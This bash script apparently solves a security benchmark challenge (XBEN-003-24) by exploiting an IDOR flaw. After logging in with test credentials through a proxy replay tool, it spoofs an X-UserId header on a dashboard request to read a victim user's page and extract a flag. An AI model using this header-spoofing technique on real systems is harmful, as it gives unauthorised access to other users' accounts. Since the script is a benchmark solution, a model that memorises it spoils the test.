#!/usr/bin/env bash
# XBEN-003-24 — "Trading Platform" (tags: idor)
#
# Proxy-mode twin of examples/xben/xben-003-x-userid-header-idor.sh. `/dashboard`
# reads the session for the current user but lets an `X-UserId` request header
# override it — validated (the id must exist) but never authorized, so it is an
# identity anyone can assert. A header is not something a page's form will send,
# which is the point of the workbench: replay the session's own request with one
# header added.
#
# Capture runs through h5i browser proxy; the login and the attack are both
# `h5i websec replay`, so they share the session's cookie jar.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
VICTIM="${2:-10052}"
SESSION="xben003p-$$"
cd "$(dirname "$0")"
. ./_proxy-lib.sh
proxy_start "$URL/"

# 1. Open the app so the session has a captured request to build on.
go "$URL/"
BASE="$(req_of GET /)"

# 2. Log in as the account we are given (username is the path, password the
#    body), so the session holds a real cookie.
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/password/test' --set 'form.password=test' >/dev/null

# 3. Replay a dashboard request with the victim's id asserted in the header.
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/dashboard' --set "header.X-UserId=$VICTIM" \
  --body 2>/dev/null | grep -oE "$FLAG_RE" | head -1
